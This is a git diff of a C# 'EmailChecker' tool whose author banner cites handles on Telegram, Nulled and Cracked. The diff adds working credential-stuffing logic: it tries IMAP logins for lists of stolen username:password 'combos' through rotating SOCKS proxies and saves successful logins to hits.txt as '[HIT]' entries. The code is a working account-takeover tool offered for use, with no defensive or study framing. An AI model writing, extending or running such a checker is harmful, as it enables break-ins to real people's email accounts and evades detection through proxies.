@@ -6,7 +6,9 @@ using System.IO;
 using System.Linq;
 using System.Threading;
 using System.Threading.Tasks;
+using Chilkat;
 using Console = Colorful.Console;
+using Task = System.Threading.Tasks.Task;
 
 namespace EmailChecker
 {
@@ -15,6 +17,9 @@ namespace EmailChecker
         private static List<string> proxies;
         private static List<string> targets;
         private static ConcurrentQueue<string> combos;
+        private static Random rng;
+
+        private static bool useSsl;
 
         
         private static int checks = 0;
@@ -89,10 +94,40 @@ namespace EmailChecker
             Console.WriteLine($"Loaded successfully {combos.Count} combo lines!", Color.Green);
         }
 
+        static Imap GetImap()
+        {
+            Imap imap = new Imap();
+            imap.Ssl = useSsl;
+
+            if (proxies != null && proxies.Count > 0)
+            {
+                string proxyLine = proxies[rng.Next(0, proxies.Count - 1)];
+                string[] split = proxyLine.Split(":");
+
+                imap.SocksHostname = split[0];
+                imap.SocksPort = int.Parse(split[1]);
+
+                if (split.Length == 4)
+                {
+                    imap.SocksUsername = split[2];
+                    imap.SocksPassword = split[3];
+                }
+            }
+
+            return imap;
+        }
+
         static async Task<bool?> Check(string username, string password, string target)
         {
-            // checks logic here
-            return null;
+            string[] split = target.Split(":");
+            Imap imap = GetImap();
+            imap.Port = int.Parse(split[1]);
+
+            bool res = imap.Connect(split[0]);
+            if (!res)
+                return null;
+
+            return imap.Login(username, password);
         }
 
         static async Task WorkerThread()
@@ -114,7 +149,7 @@ namespace EmailChecker
                     }
                     else if(res.Value)
                     {
-                        Console.WriteLine($"[HIT] {line}", Color.Green);
+                        Console.WriteLine($"[HIT] {line} - {target}", Color.Green);
                         string hitsPath = Path.Combine(Environment.CurrentDirectory, "hits.txt");
                         await File.AppendAllLinesAsync(hitsPath, new string[] {line});
                         Interlocked.Increment(ref hits);
@@ -134,6 +169,7 @@ namespace EmailChecker
             Console.WriteLine(
                 $"Email Checker - By Aesir - Telegram: @sickaesir | Nulled: @sickaesir | Cracked: @sickaesir",
                 Color.Cyan);
+            rng = new Random((int) DateTime.Now.Ticks);
             await LoadProxies();
             await LoadCombo();
             await LoadTarget();
@@ -147,6 +183,12 @@ namespace EmailChecker
 
                 break;
             }
+            
+            Console.Write("Ssl [yes/no]: ");
+            if (Console.ReadLine().ToLower() == "yes")
+                useSsl = true;
+            else
+                useSsl = false;
 
             ThreadPool.SetMinThreads(threads, threads);
             ThreadPool.SetMaxThreads(threads, threads);
